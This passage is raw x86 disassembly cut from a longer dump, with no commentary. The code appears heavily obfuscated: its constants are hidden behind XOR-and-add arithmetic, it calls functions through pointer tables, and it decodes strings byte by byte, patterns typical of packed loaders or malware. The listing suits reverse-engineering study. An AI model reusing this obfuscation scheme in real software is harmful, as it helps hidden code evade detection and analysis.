  412a41:	mov    edx,DWORD PTR [eax+0x1b8]
  412a47:	call   0x414b33
  412a4c:	push   eax
  412a4d:	mov    eax,DWORD PTR [ebp-0x18]
  412a50:	call   DWORD PTR [eax]
  412a52:	test   eax,eax
  412a54:	jne    0x412a7c
  412a56:	mov    eax,DWORD PTR [ebp+0x8]
  412a59:	mov    eax,DWORD PTR [eax+0x1d8]
  412a5f:	mov    edi,DWORD PTR [ebp+0x8]
  412a62:	add    eax,0x10
  412a65:	mov    DWORD PTR [ebp-0x18],eax
  412a68:	mov    eax,DWORD PTR [ebp+0x8]
  412a6b:	mov    edx,DWORD PTR [eax+0x1b8]
  412a71:	call   0x414b33
  412a76:	push   eax
  412a77:	mov    eax,DWORD PTR [ebp-0x18]
  412a7a:	call   DWORD PTR [eax]
  412a7c:	mov    eax,DWORD PTR [ebp-0x8]
  412a7f:	mov    ecx,DWORD PTR [ebp-0x1c]
  412a82:	xor    eax,ebx
  412a84:	add    eax,esi
  412a86:	cmp    eax,ecx
  412a88:	je     0x412c07
  412a8e:	mov    eax,DWORD PTR [ebp-0x34]
  412a91:	xor    eax,ebx
  412a93:	mov    ecx,0xffcd8d23
  412a98:	sub    ecx,eax
  412a9a:	add    ecx,DWORD PTR [ebp-0x1c]
  412a9d:	mov    eax,DWORD PTR [ebp-0x14]
  412aa0:	cmp    eax,ecx
  412aa2:	ja     0x412c07
  412aa8:	mov    DWORD PTR [ebp-0x4],0x0
  412aaf:	push   DWORD PTR [ebp+0x8]
  412ab2:	mov    edi,DWORD PTR [ebp+0x8]
  412ab5:	mov    eax,DWORD PTR [ebp+0x8]
  412ab8:	mov    edx,DWORD PTR [eax+0x1b4]
  412abe:	call   0x414b33
  412ac3:	push   eax
  412ac4:	mov    eax,DWORD PTR [ebp+0x8]
  412ac7:	mov    eax,DWORD PTR [eax+0x1a8]
  412acd:	push   DWORD PTR [eax]
  412acf:	call   0x4147d5
  412ad4:	mov    ecx,DWORD PTR [ebp+0x8]
  412ad7:	mov    ecx,DWORD PTR [ecx+0x19c]
  412add:	mov    DWORD PTR [ecx],eax
  412adf:	mov    eax,DWORD PTR [ebp+0x8]
  412ae2:	mov    edi,DWORD PTR [eax+0x1d8]
  412ae8:	mov    esi,DWORD PTR [ebp+0x8]
  412aeb:	xor    eax,eax
  412aed:	lea    edx,[ebp-0x84]
  412af3:	call   0x414b69
  412af8:	push   eax
  412af9:	mov    eax,DWORD PTR [ebp+0x8]
  412afc:	mov    eax,DWORD PTR [eax+0x19c]
  412b02:	push   DWORD PTR [eax]
  412b04:	call   DWORD PTR [edi+0x8]
  412b07:	mov    DWORD PTR [ebp-0x18],eax
  412b0a:	mov    eax,DWORD PTR [ebp+0x8]
  412b0d:	mov    edi,DWORD PTR [eax+0x1d8]
  412b13:	mov    esi,DWORD PTR [ebp+0x8]
  412b16:	xor    eax,eax
  412b18:	lea    edx,[ebp-0x70]
  412b1b:	call   0x414b69
  412b20:	push   eax
  412b21:	mov    eax,DWORD PTR [ebp+0x8]
  412b24:	mov    eax,DWORD PTR [eax+0x19c]
  412b2a:	push   DWORD PTR [eax]
  412b2c:	call   DWORD PTR [edi+0x8]
  412b2f:	and    DWORD PTR [ebp-0x10],0x0
  412b33:	mov    eax,DWORD PTR [ebp-0x10]
  412b36:	and    eax,0x7
  412b39:	add    eax,0x31
  412b3c:	push   eax
  412b3d:	call   DWORD PTR [ebp-0x18]
  412b40:	test   eax,eax
  412b42:	jne    0x412b49
  412b44:	and    DWORD PTR [ebp-0xc],eax
  412b47:	jmp    0x412b71
  412b49:	mov    eax,DWORD PTR [ebp+0x8]
  412b4c:	mov    edi,DWORD PTR [eax+0x1d8]
  412b52:	mov    esi,DWORD PTR [ebp+0x8]
  412b55:	xor    eax,eax
  412b57:	lea    edx,[ebp-0x5c]
  412b5a:	call   0x414b69
  412b5f:	push   eax
  412b60:	mov    eax,DWORD PTR [ebp+0x8]
  412b63:	mov    eax,DWORD PTR [eax+0x198]
  412b69:	push   DWORD PTR [eax]
  412b6b:	call   DWORD PTR [edi+0x8]
  412b6e:	mov    DWORD PTR [ebp-0xc],eax
  412b71:	inc    DWORD PTR [ebp-0x10]
  412b74:	cmp    DWORD PTR [ebp-0x10],0x10
  412b78:	jb     0x412b33
  412b7a:	mov    eax,DWORD PTR [ebp-0x34]
  412b7d:	mov    esi,DWORD PTR [ebp+0x8]
  412b80:	xor    eax,ebx
  412b82:	mov    edi,0x3272dd
  412b87:	add    eax,edi
  412b89:	lea    edx,[ebp-0xcc]
  412b8f:	call   0x414b69
  412b94:	push   eax
  412b95:	mov    eax,DWORD PTR [ebp-0x8]
  412b98:	mov    esi,DWORD PTR [ebp+0x8]
  412b9b:	xor    eax,ebx
  412b9d:	add    eax,edi
  412b9f:	lea    edx,[ebp-0xec]
  412ba5:	call   0x414b69
  412baa:	push   eax
  412bab:	call   DWORD PTR [ebp-0xc]
  412bae:	mov    ecx,DWORD PTR [ebp-0x8]
  412bb1:	xor    ecx,ebx
  412bb3:	add    ecx,edi
  412bb5:	cmp    ecx,eax
  412bb7:	jne    0x412bc0
  412bb9:	mov    DWORD PTR [ebp-0x4],0x1
  412bc0:	mov    eax,DWORD PTR [ebp-0x34]
  412bc3:	mov    ecx,DWORD PTR [ebp-0x14]
  412bc6:	xor    eax,ebx
  412bc8:	lea    eax,[eax+ecx*1+0x3272dd]
  412bcf:	mov    DWORD PTR [ebp-0x14],eax
  412bd2:	mov    eax,DWORD PTR [ebp-0x4]
  412bd5:	test   eax,eax
  412bd7:	je     0x412beb
  412bd9:	mov    eax,DWORD PTR [ebp-0x34]
  412bdc:	mov    ecx,DWORD PTR [ebp-0x24]
  412bdf:	xor    eax,ebx
  412be1:	lea    eax,[eax+ecx*1+0x3272dd]
  412be8:	mov    DWORD PTR [ebp-0x24],eax
  412beb:	mov    eax,DWORD PTR [ebp-0x34]
  412bee:	xor    eax,ebx
  412bf0:	mov    ecx,0xffcd8d23
  412bf5:	sub    ecx,eax
  412bf7:	add    ecx,DWORD PTR [ebp-0x1c]
  412bfa:	mov    eax,DWORD PTR [ebp-0x14]
  412bfd:	cmp    eax,ecx
  412bff:	jbe    0x412aa8
  412c05:	mov    esi,edi
  412c07:	mov    eax,DWORD PTR [ebp-0x24]
  412c0a:	mov    ecx,DWORD PTR [ebp-0x14]
  412c0d:	cmp    ecx,eax
  412c0f:	jne    0x412c22
  412c11:	push   DWORD PTR [ebp+0x8]
  412c14:	lea    eax,[ebp-0x30]
  412c17:	push   eax
  412c18:	call   0x4155e2
  412c1d:	mov    DWORD PTR [ebp-0x20],eax
  412c20:	jmp    0x412c2e
  412c22:	mov    eax,DWORD PTR [ebp-0x20]
  412c25:	mov    ecx,DWORD PTR [ebp-0x34]
  412c28:	xor    ecx,ebx
  412c2a:	add    ecx,esi
  412c2c:	xor    DWORD PTR [eax],ecx
  412c2e:	mov    eax,DWORD PTR [ebp-0x8]
  412c31:	mov    ecx,DWORD PTR [ebp-0x20]
  412c34:	xor    eax,ebx
  412c36:	add    eax,esi
  412c38:	cmp    eax,ecx
  412c3a:	je     0x413224
  412c40:	mov    eax,DWORD PTR [ebp-0x8]
  412c43:	mov    ecx,DWORD PTR [ebp-0x30]
  412c46:	xor    eax,ebx
  412c48:	add    eax,esi
  412c4a:	cmp    eax,ecx
  412c4c:	je     0x413224
  412c52:	mov    eax,DWORD PTR [ebp-0x8]
  412c55:	xor    eax,ebx
  412c57:	add    eax,esi
  412c59:	jmp    0x412c77
  412c5b:	mov    edi,DWORD PTR [ebp-0x20]
  412c5e:	mov    cl,al
  412c60:	and    cl,0x1f
  412c63:	or     dl,0xff
  412c66:	sub    dl,cl
  412c68:	add    BYTE PTR [edi+eax*1],dl
  412c6b:	mov    ecx,DWORD PTR [ebp-0x34]
  412c6e:	xor    ecx,ebx
  412c70:	lea    eax,[eax+ecx*1+0x3272dd]
  412c77:	mov    ecx,DWORD PTR [ebp-0x30]
  412c7a:	cmp    eax,ecx
  412c7c:	jb     0x412c5b
  412c7e:	mov    eax,DWORD PTR [ebp-0x30]
  412c81:	mov    DWORD PTR [ebp-0x1c],eax
  412c84:	mov    eax,DWORD PTR [ebp-0x20]
  412c87:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  412c8e:	mov    DWORD PTR [ebp-0xa8],eax
  412c94:	mov    ecx,0xf89c85b2
  412c99:	mov    DWORD PTR [ebp-0x14],ecx
  412c9c:	mov    eax,DWORD PTR [ebp-0x24]
  412c9f:	xor    eax,ebx
  412ca1:	add    eax,esi
  412ca3:	mov    DWORD PTR [ebp-0x4],eax
  412ca6:	mov    eax,DWORD PTR [ebp-0x24]
  412ca9:	xor    eax,ebx
  412cab:	add    eax,esi
  412cad:	mov    DWORD PTR [ebp-0x10],eax
  412cb0:	mov    DWORD PTR [ebp-0x40],0xf89c85d5
  412cb7:	mov    DWORD PTR [ebp-0x44],0xf89c85bc
  412cbe:	mov    eax,DWORD PTR [ebp-0x24]
  412cc1:	mov    edx,DWORD PTR [ebp-0x1c]
  412cc4:	xor    eax,ebx
  412cc6:	add    eax,esi
  412cc8:	cmp    edx,eax
  412cca:	je     0x412e02
  412cd0:	jmp    0x412dde
  412cd5:	mov    edx,DWORD PTR [ebp-0x4]
  412cd8:	mov    eax,DWORD PTR [ebp-0x1c]
  412cdb:	mov    edi,DWORD PTR [ebp-0x40]
  412cde:	sub    eax,edx
  412ce0:	xor    edi,ebx
  412ce2:	xor    edx,edx
  412ce4:	add    edi,esi
  412ce6:	div    edi
  412ce8:	mov    DWORD PTR [ebp-0x10],eax
  412ceb:	mov    eax,DWORD PTR [ebp-0x44]
  412cee:	mov    edx,DWORD PTR [ebp-0x10]
  412cf1:	xor    eax,ebx
  412cf3:	add    eax,esi
  412cf5:	cmp    edx,eax
  412cf7:	jbe    0x412d03
  412cf9:	mov    eax,DWORD PTR [ebp-0x44]
  412cfc:	xor    eax,ebx
  412cfe:	add    eax,esi
  412d00:	mov    DWORD PTR [ebp-0x10],eax
  412d03:	mov    eax,DWORD PTR [ebp-0x40]
  412d06:	mov    edx,DWORD PTR [ebp-0x10]
  412d09:	xor    eax,ebx
  412d0b:	add    eax,esi
  412d0d:	imul   eax,edx
  412d10:	mov    DWORD PTR [ebp-0x10],eax
  412d13:	mov    eax,DWORD PTR [ebp-0x24]
  412d16:	mov    edx,DWORD PTR [ebp-0x10]
  412d19:	xor    eax,ebx
  412d1b:	add    eax,esi
  412d1d:	cmp    edx,eax
  412d1f:	je     0x412dcc
  412d25:	mov    eax,DWORD PTR [ebp-0x10]
  412d28:	mov    DWORD PTR [ebp-0xc],eax
  412d2b:	mov    eax,DWORD PTR [ebp-0x4]
  412d2e:	add    eax,DWORD PTR [ebp-0xa8]
  412d34:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  412d3b:	mov    DWORD PTR [ebp-0x38],ecx
  412d3e:	mov    DWORD PTR [ebp-0x28],0xf89c85b3
  412d45:	mov    DWORD PTR [ebp-0x88],eax
  412d4b:	mov    DWORD PTR [ebp-0x28],0xf89c85b0
  412d52:	mov    DWORD PTR [ebp-0x94],ecx
  412d58:	mov    eax,DWORD PTR [ebp-0x18]
  412d5b:	xor    eax,ebx
  412d5d:	add    eax,esi
  412d5f:	jmp    0x412d8f
  412d61:	mov    eax,DWORD PTR [ebp-0x94]
  412d67:	mov    edx,DWORD PTR [ebp-0x10]
  412d6a:	xor    eax,ebx
  412d6c:	add    eax,esi
  412d6e:	imul   eax,edx
  412d71:	mov    edx,DWORD PTR [ebp-0x88]
  412d77:	mov    BYTE PTR [eax+edx*1],0x0
  412d7b:	mov    eax,DWORD PTR [ebp-0x28]
  412d7e:	mov    edx,DWORD PTR [ebp-0x38]
  412d81:	xor    eax,ebx
  412d83:	xor    edx,ebx
  412d85:	add    eax,esi
  412d87:	add    edx,esi
  412d89:	imul   eax,edx
  412d8c:	add    eax,DWORD PTR [ebp-0x10]
  412d8f:	mov    DWORD PTR [ebp-0x10],eax
  412d92:	mov    eax,DWORD PTR [ebp-0x10]
  412d95:	mov    edx,DWORD PTR [ebp-0xc]
  412d98:	cmp    edx,eax
  412d9a:	jb     0x412d61
  412d9c:	mov    eax,DWORD PTR [ebp-0x38]
  412d9f:	mov    edx,DWORD PTR [ebp-0xc]
  412da2:	xor    eax,ebx
  412da4:	add    eax,esi
  412da6:	imul   eax,edx
  412da9:	mov    edx,DWORD PTR [ebp-0x18]
  412dac:	xor    edx,ebx
  412dae:	add    edx,esi
  412db0:	or     eax,edx
  412db2:	mov    edx,DWORD PTR [ebp-0x14]
  412db5:	xor    edx,ebx
  412db7:	add    eax,edx
  412db9:	mov    edx,DWORD PTR [ebp-0x14]
  412dbc:	xor    edx,ebx
  412dbe:	add    eax,edx
  412dc0:	mov    edx,DWORD PTR [ebp-0x4]
  412dc3:	lea    eax,[eax+edx*1+0x64e5ba]
  412dca:	jmp    0x412ddb
  412dcc:	mov    eax,DWORD PTR [ebp-0x14]
  412dcf:	mov    edx,DWORD PTR [ebp-0x4]
  412dd2:	xor    eax,ebx
  412dd4:	lea    eax,[eax+edx*1+0x3272dd]
  412ddb:	mov    DWORD PTR [ebp-0x4],eax
  412dde:	mov    eax,DWORD PTR [ebp-0x14]
  412de1:	xor    eax,ebx
  412de3:	mov    edx,0xffcd8d23
  412de8:	sub    edx,eax
  412dea:	add    edx,DWORD PTR [ebp-0x1c]
  412ded:	mov    eax,DWORD PTR [ebp-0x14]
  412df0:	mov    edi,DWORD PTR [ebp-0x4]
  412df3:	xor    eax,ebx
  412df5:	add    eax,esi
  412df7:	imul   eax,edi
  412dfa:	cmp    eax,edx
  412dfc:	jbe    0x412cd5
  412e02:	mov    eax,DWORD PTR [ebp-0x8]
  412e05:	mov    ecx,DWORD PTR [ebp-0x30]
  412e08:	mov    eax,DWORD PTR [ebp+0x8]
  412e0b:	mov    edx,DWORD PTR [ebp-0x3c]
  412e0e:	mov    eax,DWORD PTR [eax+0x1d8]
  412e14:	xor    edx,ebx
  412e16:	add    edx,esi
  412e18:	push   edx
  412e19:	mov    edx,DWORD PTR [ebp-0x2c]
  412e1c:	xor    edx,ebx
  412e1e:	add    edx,esi
  412e20:	push   edx
  412e21:	push   ecx
  412e22:	mov    DWORD PTR [ebp-0x28],ecx
  412e25:	mov    ecx,DWORD PTR [ebp-0x8]
  412e28:	xor    ecx,ebx
  412e2a:	add    ecx,esi
  412e2c:	push   ecx
  412e2d:	call   DWORD PTR [eax+0x14]
  412e30:	mov    edi,eax
  412e32:	mov    eax,DWORD PTR [ebp-0x8]
  412e35:	xor    eax,ebx
  412e37:	add    eax,esi
  412e39:	cmp    eax,edi
  412e3b:	je     0x412e96
  412e3d:	mov    eax,DWORD PTR [ebp-0x8]
  412e40:	jmp    0x412e63
  412e42:	mov    ecx,DWORD PTR [ebp-0x20]
  412e45:	xor    eax,ebx
  412e47:	mov    cl,BYTE PTR [ecx+eax*1+0x3272dd]
  412e4e:	mov    BYTE PTR [eax+edi*1+0x3272dd],cl
  412e55:	mov    ecx,DWORD PTR [ebp-0x34]
  412e58:	xor    ecx,ebx
  412e5a:	lea    eax,[ecx+eax*1+0x3272dd]
  412e61:	xor    eax,ebx
  412e63:	mov    ecx,DWORD PTR [ebp-0x30]
  412e66:	sub    ecx,esi
  412e68:	xor    ecx,ebx
  412e6a:	cmp    eax,ecx
  412e6c:	jne    0x412e42
  412e6e:	mov    eax,DWORD PTR [ebp+0x8]
  412e71:	mov    ecx,DWORD PTR [ebp-0x48]
  412e74:	mov    eax,DWORD PTR [eax+0x1d8]
  412e7a:	xor    ecx,ebx
  412e7c:	add    ecx,esi
  412e7e:	push   ecx
  412e7f:	mov    ecx,DWORD PTR [ebp-0x8]
  412e82:	xor    ecx,ebx
  412e84:	add    ecx,esi
  412e86:	push   ecx
  412e87:	push   DWORD PTR [ebp-0x20]
  412e8a:	call   DWORD PTR [eax+0x18]
  412e8d:	mov    eax,DWORD PTR [ebp-0x28]
  412e90:	mov    DWORD PTR [ebp-0x20],edi
  412e93:	mov    DWORD PTR [ebp-0x30],eax
  412e96:	mov    edi,DWORD PTR [ebp-0x20]
  412e99:	mov    eax,DWORD PTR [ebp-0x34]
  412e9c:	mov    ecx,DWORD PTR [ebp-0x8]
  412e9f:	xor    eax,ebx
  412ea1:	mov    DWORD PTR [ebp-0x28],edi
  412ea4:	add    eax,esi
  412ea6:	mov    DWORD PTR [ebp-0x50],0x3d122a12
  412ead:	mov    DWORD PTR [ebp-0x4c],0x27123f12
  412eb4:	jmp    0x412ee8
  412eb6:	xor    ecx,ebx
  412eb8:	mov    dl,BYTE PTR [ebp+ecx*1+0x32728d]
  412ebf:	xor    dl,0x71
  412ec2:	sub    dl,0xb
  412ec5:	mov    DWORD PTR [ebp-0x2c],ecx
  412ec8:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272dd]
  412ed0:	movzx  edx,dl
  412ed3:	cmp    ecx,edx
  412ed5:	jne    0x412ef2
  412ed7:	mov    ecx,DWORD PTR [ebp-0x34]
  412eda:	mov    edx,DWORD PTR [ebp-0x2c]
  412edd:	xor    ecx,ebx
  412edf:	lea    ecx,[ecx+edx*1+0x3272dd]
  412ee6:	xor    ecx,ebx
  412ee8:	cmp    ecx,0xf89c85bd
  412eee:	jne    0x412eb6
  412ef0:	jmp    0x412ef9
  412ef2:	mov    eax,DWORD PTR [ebp-0x8]
  412ef5:	xor    eax,ebx
  412ef7:	add    eax,esi
  412ef9:	mov    ecx,DWORD PTR [ebp-0x8]
  412efc:	xor    ecx,ebx
  412efe:	add    ecx,esi
  412f00:	cmp    ecx,eax
  412f02:	je     0x413075
  412f08:	mov    eax,DWORD PTR [edi+0x8]
  412f0b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  412f12:	mov    DWORD PTR [ebp-0x2c],0xf89cc304
  412f19:	mov    DWORD PTR [ebp-0x38],0xf89cb5b5
  412f20:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  412f27:	mov    DWORD PTR [ebp-0xc],eax
  412f2a:	mov    eax,DWORD PTR [ebp+0x8]
  412f2d:	mov    ecx,DWORD PTR [ebp-0x18]
  412f30:	xor    ecx,ebx
  412f32:	add    ecx,esi
  412f34:	push   ecx
  412f35:	mov    ecx,DWORD PTR [ebp-0x38]
  412f38:	mov    eax,DWORD PTR [eax+0x1d8]
  412f3e:	xor    ecx,ebx
  412f40:	add    ecx,esi
  412f42:	push   ecx
  412f43:	mov    ecx,DWORD PTR [ebp-0x2c]
  412f46:	xor    ecx,ebx
  412f48:	add    ecx,esi
  412f4a:	push   ecx
  412f4b:	mov    ecx,DWORD PTR [ebp-0x4]
  412f4e:	xor    ecx,ebx
  412f50:	add    ecx,esi
  412f52:	push   ecx
  412f53:	call   DWORD PTR [eax+0x14]
  412f56:	mov    edi,eax
  412f58:	mov    eax,DWORD PTR [ebp+0x8]
  412f5b:	mov    ecx,DWORD PTR [ebp-0x18]
  412f5e:	mov    eax,DWORD PTR [eax+0x1d8]
  412f64:	xor    ecx,ebx
  412f66:	add    ecx,esi
  412f68:	push   ecx
  412f69:	mov    ecx,DWORD PTR [ebp-0x38]
  412f6c:	xor    ecx,ebx
  412f6e:	add    ecx,esi
  412f70:	push   ecx
  412f71:	mov    ecx,DWORD PTR [ebp-0x4]
  412f74:	push   DWORD PTR [ebp-0xc]
  412f77:	xor    ecx,ebx
  412f79:	add    ecx,esi
  412f7b:	push   ecx
  412f7c:	call   DWORD PTR [eax+0x14]
  412f7f:	mov    ecx,DWORD PTR [ebp-0x4]
  412f82:	xor    ecx,ebx
  412f84:	add    ecx,esi
  412f86:	mov    DWORD PTR [ebp-0x18],eax
  412f89:	cmp    ecx,edi
  412f8b:	je     0x413251
  412f91:	mov    ecx,DWORD PTR [ebp-0x4]
  412f94:	xor    ecx,ebx
  412f96:	add    ecx,esi
  412f98:	cmp    ecx,eax
  412f9a:	je     0x413251
  412fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c85b0
  412fa7:	mov    DWORD PTR [ebp-0x3c],0xf89c85b3
  412fae:	mov    ecx,DWORD PTR [ebp-0x2c]
  412fb1:	xor    cl,0x96
  412fb4:	sub    cl,0x23
  412fb7:	mov    BYTE PTR [edi],cl
  412fb9:	mov    ecx,DWORD PTR [ebp-0x4]
  412fbc:	xor    cl,0x96
  412fbf:	sub    cl,0x23
  412fc2:	mov    BYTE PTR [edi+0x1],cl
  412fc5:	mov    ecx,DWORD PTR [ebp-0x3c]
  412fc8:	xor    cl,0x96
  412fcb:	sub    cl,0x23
  412fce:	mov    BYTE PTR [edi+0x2],cl
  412fd1:	and    DWORD PTR [ebp-0x98],0x0
  412fd8:	and    DWORD PTR [ebp-0xa4],0x0
  412fdf:	lea    ecx,[ebp-0xa4]
  412fe5:	push   ecx
  412fe6:	push   DWORD PTR [ebp-0xc]
  412fe9:	push   eax
  412fea:	lea    eax,[ebp-0x98]
  412ff0:	push   eax
  412ff1:	mov    eax,DWORD PTR [ebp-0x28]
  412ff4:	push   DWORD PTR [eax+0xc]
  412ff7:	mov    eax,DWORD PTR [ebp-0x20]
  412ffa:	add    eax,0x10
  412ffd:	push   eax
  412ffe:	push   edi
  412fff:	call   0x41241b
  413004:	mov    DWORD PTR [ebp-0x2c],eax
  413007:	mov    eax,DWORD PTR [ebp+0x8]
  41300a:	mov    ecx,DWORD PTR [ebp-0x48]
  41300d:	mov    eax,DWORD PTR [eax+0x1d8]
  413013:	xor    ecx,ebx
  413015:	add    ecx,esi
  413017:	push   ecx
  413018:	mov    ecx,DWORD PTR [ebp-0x4]
  41301b:	xor    ecx,ebx
  41301d:	add    ecx,esi
  41301f:	push   ecx
  413020:	push   edi
  413021:	call   DWORD PTR [eax+0x18]
  413024:	mov    eax,DWORD PTR [ebp-0x2c]
  413027:	add    eax,0xffcd8d23
  41302c:	xor    eax,ebx
  41302e:	cmp    eax,0xf89c85b5
  413033:	mov    eax,DWORD PTR [ebp+0x8]
  413036:	mov    eax,DWORD PTR [eax+0x1d8]
  41303c:	mov    ecx,DWORD PTR [ebp-0x48]
  41303f:	jne    0x413062
  413041:	xor    ecx,ebx
  413043:	add    ecx,esi
  413045:	push   ecx
  413046:	mov    ecx,DWORD PTR [ebp-0x4]
  413049:	xor    ecx,ebx
  41304b:	add    ecx,esi
  41304d:	push   ecx
  41304e:	push   DWORD PTR [ebp-0x20]
  413051:	call   DWORD PTR [eax+0x18]
  413054:	mov    eax,DWORD PTR [ebp-0x18]
  413057:	mov    DWORD PTR [ebp-0x20],eax
  41305a:	mov    eax,DWORD PTR [ebp-0xc]
  41305d:	mov    DWORD PTR [ebp-0x30],eax
  413060:	jmp    0x413075
  413062:	xor    ecx,ebx
  413064:	add    ecx,esi
  413066:	push   ecx
  413067:	mov    ecx,DWORD PTR [ebp-0x4]
  41306a:	xor    ecx,ebx
  41306c:	add    ecx,esi
  41306e:	push   ecx
  41306f:	push   DWORD PTR [ebp-0x18]
  413072:	call   DWORD PTR [eax+0x18]
  413075:	mov    eax,DWORD PTR [ebp-0x30]
  413078:	mov    DWORD PTR [ebp-0x24],eax
  41307b:	mov    eax,DWORD PTR [ebp-0x20]
  41307e:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  413085:	mov    DWORD PTR [ebp-0x2c],eax
  413088:	mov    ecx,0xf89c85b2
  41308d:	mov    DWORD PTR [ebp-0x14],ecx
  413090:	mov    eax,DWORD PTR [ebp-0x1c]
  413093:	xor    eax,ebx
  413095:	add    eax,esi
  413097:	mov    DWORD PTR [ebp-0x4],eax
  41309a:	mov    eax,DWORD PTR [ebp-0x1c]
  41309d:	xor    eax,ebx
  41309f:	add    eax,esi
  4130a1:	mov    DWORD PTR [ebp-0xc],eax
  4130a4:	mov    DWORD PTR [ebp-0x38],0xf89c85d5
  4130ab:	mov    DWORD PTR [ebp-0x18],0xf89c85bc
  4130b2:	mov    eax,DWORD PTR [ebp-0x1c]
  4130b5:	mov    edx,DWORD PTR [ebp-0x24]
  4130b8:	xor    eax,ebx
  4130ba:	add    eax,esi
  4130bc:	cmp    edx,eax
  4130be:	je     0x4131ed
  4130c4:	jmp    0x4131c9
  4130c9:	mov    edx,DWORD PTR [ebp-0x4]
  4130cc:	mov    eax,DWORD PTR [ebp-0x24]
  4130cf:	mov    edi,DWORD PTR [ebp-0x38]
  4130d2:	sub    eax,edx
  4130d4:	xor    edi,ebx
  4130d6:	xor    edx,edx
  4130d8:	add    edi,esi
  4130da:	div    edi
  4130dc:	mov    DWORD PTR [ebp-0xc],eax
  4130df:	mov    eax,DWORD PTR [ebp-0x18]
  4130e2:	mov    edx,DWORD PTR [ebp-0xc]
  4130e5:	xor    eax,ebx
  4130e7:	add    eax,esi
  4130e9:	cmp    edx,eax
  4130eb:	jbe    0x4130f7
  4130ed:	mov    eax,DWORD PTR [ebp-0x18]
  4130f0:	xor    eax,ebx
  4130f2:	add    eax,esi
  4130f4:	mov    DWORD PTR [ebp-0xc],eax
  4130f7:	mov    eax,DWORD PTR [ebp-0x38]
  4130fa:	mov    edx,DWORD PTR [ebp-0xc]
  4130fd:	xor    eax,ebx
  4130ff:	add    eax,esi
  413101:	imul   eax,edx
  413104:	mov    DWORD PTR [ebp-0xc],eax
  413107:	mov    eax,DWORD PTR [ebp-0x1c]
  41310a:	mov    edx,DWORD PTR [ebp-0xc]
  41310d:	xor    eax,ebx
  41310f:	add    eax,esi
  413111:	cmp    edx,eax
  413113:	je     0x4131b7
  413119:	mov    eax,DWORD PTR [ebp-0xc]
  41311c:	mov    DWORD PTR [ebp-0xc],eax
  41311f:	mov    eax,DWORD PTR [ebp-0x4]
  413122:	add    eax,DWORD PTR [ebp-0x2c]
  413125:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  41312c:	mov    DWORD PTR [ebp-0x40],ecx
  41312f:	mov    DWORD PTR [ebp-0x3c],0xf89c85b3
  413136:	mov    DWORD PTR [ebp-0x28],eax
  413139:	mov    DWORD PTR [ebp-0x88],0xf89c85b0
  413143:	mov    DWORD PTR [ebp-0x3c],ecx
  413146:	mov    eax,DWORD PTR [ebp-0x44]
  413149:	xor    eax,ebx
  41314b:	add    eax,esi
  41314d:	jmp    0x41317a
  41314f:	mov    eax,DWORD PTR [ebp-0x3c]
  413152:	mov    edx,DWORD PTR [ebp-0x10]
  413155:	xor    eax,ebx
  413157:	add    eax,esi
  413159:	imul   eax,edx
  41315c:	mov    edx,DWORD PTR [ebp-0x28]
  41315f:	mov    BYTE PTR [eax+edx*1],0x0
  413163:	mov    eax,DWORD PTR [ebp-0x88]
  413169:	mov    edx,DWORD PTR [ebp-0x40]
  41316c:	xor    eax,ebx
  41316e:	xor    edx,ebx
  413170:	add    eax,esi
  413172:	add    edx,esi
  413174:	imul   eax,edx
  413177:	add    eax,DWORD PTR [ebp-0x10]
  41317a:	mov    DWORD PTR [ebp-0x10],eax
  41317d:	mov    eax,DWORD PTR [ebp-0x10]
  413180:	mov    edx,DWORD PTR [ebp-0xc]
  413183:	cmp    edx,eax
  413185:	jb     0x41314f
  413187:	mov    eax,DWORD PTR [ebp-0x40]
  41318a:	mov    edx,DWORD PTR [ebp-0xc]
  41318d:	xor    eax,ebx
  41318f:	add    eax,esi
  413191:	imul   eax,edx
  413194:	mov    edx,DWORD PTR [ebp-0x44]
  413197:	xor    edx,ebx
  413199:	add    edx,esi
  41319b:	or     eax,edx
  41319d:	mov    edx,DWORD PTR [ebp-0x14]
  4131a0:	xor    edx,ebx
  4131a2:	add    eax,edx
  4131a4:	mov    edx,DWORD PTR [ebp-0x14]
  4131a7:	xor    edx,ebx
  4131a9:	add    eax,edx
  4131ab:	mov    edx,DWORD PTR [ebp-0x4]
  4131ae:	lea    eax,[eax+edx*1+0x64e5ba]
  4131b5:	jmp    0x4131c6
  4131b7:	mov    eax,DWORD PTR [ebp-0x14]
  4131ba:	mov    edx,DWORD PTR [ebp-0x4]
  4131bd:	xor    eax,ebx
  4131bf:	lea    eax,[eax+edx*1+0x3272dd]
  4131c6:	mov    DWORD PTR [ebp-0x4],eax
  4131c9:	mov    eax,DWORD PTR [ebp-0x14]
  4131cc:	xor    eax,ebx
  4131ce:	mov    edx,0xffcd8d23
  4131d3:	sub    edx,eax
  4131d5:	add    edx,DWORD PTR [ebp-0x24]
  4131d8:	mov    eax,DWORD PTR [ebp-0x14]
  4131db:	mov    edi,DWORD PTR [ebp-0x4]
  4131de:	xor    eax,ebx
  4131e0:	add    eax,esi
  4131e2:	imul   eax,edi
  4131e5:	cmp    eax,edx
  4131e7:	jbe    0x4130c9
  4131ed:	push   DWORD PTR [ebp+0x8]
  4131f0:	mov    eax,DWORD PTR [ebp+0x8]
  4131f3:	push   DWORD PTR [eax+0x1cc]
  4131f9:	lea    eax,[ebp-0xa0]
  4131ff:	push   eax
  413200:	mov    eax,DWORD PTR [ebp+0x8]
  413203:	mov    eax,DWORD PTR [eax+0x1c4]
  413209:	push   DWORD PTR [eax]
  41320b:	mov    eax,DWORD PTR [ebp+0x8]
  41320e:	mov    eax,DWORD PTR [eax+0x1c0]
  413214:	push   DWORD PTR [eax]
  413216:	push   DWORD PTR [ebp-0x30]
  413219:	push   DWORD PTR [ebp-0x20]
  41321c:	call   0x413cf2
  413221:	mov    DWORD PTR [ebp-0x2c],eax
  413224:	mov    eax,DWORD PTR [ebp-0x8]
  413227:	mov    ecx,DWORD PTR [ebp-0x20]
  41322a:	xor    eax,ebx
  41322c:	add    eax,esi
  41322e:	cmp    eax,ecx
  413230:	je     0x413251
  413232:	mov    eax,DWORD PTR [ebp+0x8]
  413235:	mov    ecx,DWORD PTR [ebp-0x48]
  413238:	mov    eax,DWORD PTR [eax+0x1d8]
  41323e:	xor    ecx,ebx
